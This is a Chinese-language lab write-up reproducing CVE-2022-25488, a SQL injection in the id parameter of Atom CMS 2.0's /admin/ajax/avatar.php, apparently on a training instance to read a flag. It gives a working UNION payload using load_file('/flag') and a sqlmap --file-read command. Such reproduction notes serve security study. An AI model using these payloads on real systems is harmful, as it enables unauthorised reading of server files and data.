## 1. 漏洞介绍
- tom CMS是一个内容管理系统。
- Atom CMS 2.0版本 存在安全漏洞，
- 该漏洞源于通过`/admin/ajax/avatar.[**php**](https://it.cha138.com/php/)`中的 `id 参数`发现 存在 SQL 注入漏洞。
- Atom CMS v2.0 通过`/admin/ajax/avatar.php`中的 `id 参数`被发现包含 SQL 注入漏洞。
## 2. 影响版本
Atom CMS 2.0版本
## 3. 漏洞复现
### 3.1. 手动注入
- 开启环境后，加上`/admin/ajax/avatar.php`直接访问发现页面空白的
```ad-tip
title:URL
collapse:open
 http://eci-2ze22iukyy2k343joc6h.cloudeci1.ichunqiu.com/admin/ajax/avatar.php
```
- 查看源码
![CVE-2022-25488-Picture-1.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-25488-Picture-1.jpg)
- 由于 `id` 参数存在注入，所以添加 `id` 后观察是否有啥变化【变动如下】
![CVE-2022-25488-Picture-2.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-25488-Picture-2.jpg)
- 尝试 `union` 注入测试
![CVE-2022-25488-Picture-3.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-25488-Picture-3.jpg)
- 既然存在 `union` 注入，进一步尝试 `load_file` 直接读取 `flag` 
```ad-tip
title: URL
collapse: open
view-source:eci-2ze22iukyy2k343joc6h.cloudeci1.ichunqiu.com/admin/ajax/avatar.php?id=0 union select load_file('/flag')
```
- 结果
![CVE-2022-25488-Picture-4.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-25488-Picture-4.jpg)
### 3.2. sqlmap 注入
```ad-tip
title:sqlmap 注入命令
collapse:open
python sqlmap.py -u "http://eci-2ze22iukyy2k343joc6h.cloudeci1.ichunqiu.com/admin/ajax/avatar.php?id=1" --file-read "/flag" --batch
```
![CVE-2022-25488-Picture-5.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-25488-Picture-5.jpg)